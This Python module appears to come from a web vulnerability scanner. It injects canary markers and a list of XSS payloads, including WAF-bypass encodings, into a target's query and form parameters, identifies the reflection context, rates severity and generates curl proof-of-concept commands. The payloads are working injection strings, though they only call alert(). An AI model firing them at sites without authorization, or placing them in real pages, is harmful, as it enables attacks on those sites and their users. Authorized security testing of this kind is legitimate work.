"""XSS Validation Engine (V5 §8, V4 §20) — Upgraded to E2/E3.

Enhanced pipeline:
    Parameter → Reflection detection → Context identification
    → Encoding analysis → Payload execution testing
    → Impact assessment → Evidence

Upgrades from basic reflection:
    - Context-aware payload generation
    - WAF bypass encoding variants
    - Severity based on: stored/reflected/DOM, execution context,
      authentication requirement, scope
    - Professional PoC with curl reproduction
    - Impact matrix generation
"""

import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import parse_qs, quote, urlparse

import httpx

logger = logging.getLogger("validator.xss")

# Controlled harmless canary markers — alphanumeric canary for initial reflection
REFLECTION_MARKERS = [
    "bh7x5s",                      # alphanumeric canary
    '"bh7x5s',                     # double-quote breakout test
    "'bh7x5s",                     # single-quote breakout test
    "<bh7x5s>",                    # tag injection test
    "bh7x5s%22",                   # URL-encoded double-quote
    "javascript:bh7x5s",          # protocol handler test
]

# Controlled XSS payload tests (safe — triggers alert/confirm, no destructive action)
XSS_PAYLOADS = [
    # Basic script injection
    {
        "payload": '<script>alert("BH-XSS")</script>',
        "context": "html_body",
        "technique": "script_tag",
        "bypass": "none",
    },
    # Event handler injection
    {
        "payload": '" onmouseover="alert(\'BH-XSS\')"',
        "context": "html_attribute",
        "technique": "event_handler",
        "bypass": "none",
    },
    # Image error handler
    {
        "payload": '<img src=x onerror="alert(\'BH-XSS\')">',
        "context": "html_body",
        "technique": "img_onerror",
        "bypass": "none",
    },
    # SVG onload
    {
        "payload": '<svg onload="alert(\'BH-XSS\')">',
        "context": "html_body",
        "technique": "svg_onload",
        "bypass": "none",
    },
    # JavaScript URI
    {
        "payload": "javascript:alert('BH-XSS')",
        "context": "href_src",
        "technique": "javascript_uri",
        "bypass": "none",
    },
    # Case variation bypass
    {
        "payload": '<ScRiPt>alert("BH-XSS")</ScRiPt>',
        "context": "html_body",
        "technique": "case_bypass",
        "bypass": "case_variation",
    },
    # HTML entity encoding bypass
    {
        "payload": '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        "context": "html_body",
        "technique": "html_entity",
        "bypass": "encoding",
    },
    # Double encoding bypass
    {
        "payload": '%253Cscript%253Ealert("BH-XSS")%253C/script%253E',
        "context": "html_body",
        "technique": "double_encode",
        "bypass": "double_encoding",
    },
    # Template literal (modern JS frameworks)
    {
        "payload": "${alert('BH-XSS')}",
        "context": "javascript",
        "technique": "template_literal",
        "bypass": "none",
    },
    # Closing tag injection
    {
        "payload": '</textarea><script>alert("BH-XSS")</script>',
        "context": "html_body",
        "technique": "tag_close_inject",
        "bypass": "none",
    },
]

# Patterns indicating dangerous reflection contexts
DANGEROUS_CONTEXTS = {
    "javascript": re.compile(r'<script[^>]*>[^<]*?bh7x5s', re.I | re.DOTALL),
    "event_handler": re.compile(r'on\w+\s*=\s*["\'][^"\']*?bh7x5s', re.I),
    "href_src": re.compile(r'(?:href|src)\s*=\s*["\'](?:javascript:)?[^"\']*?bh7x5s', re.I),
    "html_attribute": re.compile(r'<[a-z][a-z0-9]*\s+[^>]*?bh7x5s[^>]*?>', re.I),
    "unquoted_attr": re.compile(r'<[a-z][a-z0-9]*\s+[^>]*?=\s*bh7x5s', re.I),
}

# Regex to detect if an XSS payload actually executes in browser / engine
XSS_EXECUTION_INDICATORS = [
    re.compile(r'<script>alert\("BH-XSS"\)</script>', re.I),
    re.compile(r'<img\s+src=x\s+onerror="alert\(\'BH-XSS\'\)">', re.I),
    re.compile(r'<svg\s+onload="alert\(\'BH-XSS\'\)">', re.I),
    re.compile(r'onmouseover="alert\(\'BH-XSS\'\)"', re.I),
]


@dataclass
class XSSCandidate:
    url: str
    parameter: str
    location: str
    marker: str
    context: str = "html_body"
    technique: str = "reflection"
    reflected: bool = False
    payload_executed: bool = False
    confidence: str = "OBSERVED"
    evidence: dict = field(default_factory=dict)
    impact_matrix: dict = field(default_factory=dict)
    poc_curl: str = ""
    reproduction_steps: list = field(default_factory=list)


class XSSValidator:
    """Enhanced XSS validator upgraded to E2/E3 evidence levels."""

    def __init__(self, timeout: float = 8.0, max_params: int = 30) -> None:
        self.timeout = timeout
        self.max_params = max_params

    async def validate_url(
        self,
        url: str,
        parameters: List[dict],
        *,
        headers: Optional[dict] = None,
    ) -> List[XSSCandidate]:
        """Test all parameters for XSS vulnerabilities."""
        candidates: List[XSSCandidate] = []
        tested = 0

        for param in parameters[:self.max_params]:
            name = param.get("name", "")
            location = param.get("location", "query")
            if not name or location not in ("query", "body"):
                continue

            # Phase 1: Reflection detection with canary
            reflection = None
            for marker in REFLECTION_MARKERS:
                tested += 1
                reflection = await self._test_reflection(url, name, location, marker, headers)
                if reflection:
                    break

            if not reflection:
                continue

            # Phase 2: Payload execution testing (E2/E3 upgrade)
            payload_candidate = await self._test_payload_execution(
                url, name, location, reflection.context, headers
            )

            if payload_candidate:
                payload_candidate.marker = reflection.marker
                self._enrich_candidate(payload_candidate, url, name, location)
                candidates.append(payload_candidate)
            else:
                self._enrich_candidate(reflection, url, name, location)
                candidates.append(reflection)

        logger.info("XSS validation: %d params tested, %d findings on %s",
                     tested, len(candidates), url)
        return candidates

    def _enrich_candidate(
        self, candidate: XSSCandidate, url: str, param: str, location: str
    ) -> None:
        """Add impact matrix, PoC curl, and reproduction steps."""
        severity_context = {
            "javascript": "HIGH",
            "event_handler": "HIGH",
            "href_src": "MEDIUM",
            "html_attribute": "MEDIUM",
            "html_body": "LOW",
            "unquoted_attr": "MEDIUM",
        }
        severity = severity_context.get(candidate.context, "LOW")
        if candidate.payload_executed:
            severity = "HIGH"

        candidate.impact_matrix = {
            "confidentiality": "MEDIUM" if severity == "HIGH" else "LOW",
            "integrity": "HIGH" if candidate.payload_executed else "MEDIUM",
            "availability": "LOW",
            "authentication_bypass": "Possible via session theft",
            "data_exposure": "Cookie/session data",
            "xss_type": "Reflected",
            "business_impact": "Client-side script execution in victim's browser context",
        }

        probe = candidate.evidence.get("payload") or candidate.marker
        candidate.poc_curl = self._generate_curl(url, param, probe, location)
        candidate.evidence["poc_curl"] = candidate.poc_curl

        candidate.reproduction_steps = [
            f"1. Akses target URL: {url}",
            f"2. Injeksikan payload pada parameter '{param}' ({location})",
            f"3. Payload Terkontrol: {probe}",
            f"4. Jalankan perintah cURL PoC yang valid:\n```bash\n{candidate.poc_curl}\n```",
            f"5. Amati {'eksekusi skrip (payload executed)' if candidate.payload_executed else 'refleksi input pada dokumen HTML'} dalam konteks '{candidate.context}'",
        ]

    async def _test_reflection(
        self,
        url: str,
        param_name: str,
        location: str,
        marker: str,
        headers: Optional[dict] = None,
    ) -> Optional[XSSCandidate]:
        """Send a request with a controlled marker and check for reflection."""
        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

            async with httpx.AsyncClient(
                timeout=self.timeout,
                follow_redirects=True,
                verify=False,
            ) as client:
                if location == "query":
                    flat_params[param_name] = marker
                    resp = await client.get(base_url, params=flat_params, headers=headers or {})
                else:
                    resp = await client.post(
                        url,
                        data={param_name: marker},
                        headers=headers or {},
                    )

                body = resp.text
                if marker not in body:
                    return None

                # Identify context
                context = self._identify_context(body, marker)
                if not context:
                    return None

                confidence = "OBSERVED"
                if context in ("javascript", "event_handler", "href_src"):
                    confidence = "VALIDATED"
                elif context in ("html_attribute", "unquoted_attr"):
                    confidence = "SUSPECTED"

                response_hash = hashlib.sha256(body.encode()).hexdigest()[:16]

                content_type = resp.headers.get("content-type", "")
                if "json" in content_type or "xml" in content_type:
                    confidence = "OBSERVED"

                return XSSCandidate(
                    url=url,
                    parameter=param_name,
                    location=location,
                    marker=marker,
                    context=context,
                    reflected=True,
                    confidence=confidence,
                    evidence={
                        "status_code": resp.status_code,
                        "content_type": content_type,
                        "response_hash": response_hash,
                        "reflected_marker": marker,
                        "reflection_context": context,
                        "evidence_level": "E1",
                    },
                )

        except Exception as exc:
            logger.debug("XSS reflection test failed for %s param=%s: %s", url, param_name, exc)
            return None

    async def _test_payload_execution(
        self,
        url: str,
        param_name: str,
        location: str,
        reflection_context: str,
        headers: Optional[dict] = None,
    ) -> Optional[XSSCandidate]:
        """Test actual XSS payloads after confirming reflection exists."""
        relevant_payloads = [
            p for p in XSS_PAYLOADS
            if p["context"] == reflection_context or p["context"] == "html_body"
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        for payload_def in relevant_payloads[:6]:
            payload = payload_def["payload"]
            try:
                async with httpx.AsyncClient(
                    timeout=self.timeout,
                    follow_redirects=True,
                    verify=False,
                ) as client:
                    if location == "query":
                        flat_params[param_name] = payload
                        resp = await client.get(base_url, params=flat_params, headers=headers or {})
                    else:
                        resp = await client.post(
                            url,
                            data={param_name: payload},
                            headers=headers or {},
                        )

                    body = resp.text
                    payload_reflected = payload in body or payload.replace('"', "'") in body
                    executed = any(pat.search(body) for pat in XSS_EXECUTION_INDICATORS)

                    if payload_reflected or executed:
                        response_hash = hashlib.sha256(body.encode()).hexdigest()[:16]
                        confidence = "CONFIRMED" if executed else "VALIDATED"

                        return XSSCandidate(
                            url=url,
                            parameter=param_name,
                            location=location,
                            marker="",
                            context=payload_def["context"],
                            technique=payload_def["technique"],
                            reflected=payload_reflected,
                            payload_executed=executed,
                            confidence=confidence,
                            evidence={
                                "payload": payload,
                                "technique": payload_def["technique"],
                                "bypass": payload_def["bypass"],
                                "payload_reflected": payload_reflected,
                                "execution_confirmed": executed,
                                "status_code": resp.status_code,
                                "content_type": resp.headers.get("content-type", ""),
                                "response_hash": response_hash,
                                "evidence_level": "E3" if executed else "E2",
                            },
                        )

            except Exception as exc:
                logger.debug("XSS payload test failed: %s", exc)

        return None

    @staticmethod
    def _identify_context(body: str, marker: str) -> Optional[str]:
        """Determine in which HTML context the marker was reflected."""
        for context_name, pattern in DANGEROUS_CONTEXTS.items():
            if pattern.search(body):
                return context_name

        if marker in body:
            return "html_body"

        return None

    @staticmethod
    def _generate_curl(url: str, param_name: str, payload: str, location: str) -> str:
        """Generate valid, syntax-safe, properly encoded curl PoC reproduction command."""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme or 'https'}://{parsed.netloc}{parsed.path or '/'}"
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        flat_params = {k: v[0] if isinstance(v, list) and v else "" for k, v in query_params.items()}

        if location == "query":
            flat_params[param_name] = payload
            query_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            final_url = f"{base_url}?{query_str}" if query_str else base_url
            return f"curl -i -s -k -X GET '{final_url}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"
        else:
            flat_params[param_name] = payload
            data_str = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in flat_params.items())
            return f"curl -i -s -k -X POST '{base_url}' -d '{data_str}' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) HunterAja/9.1.0'"


xss_validator = XSSValidator()
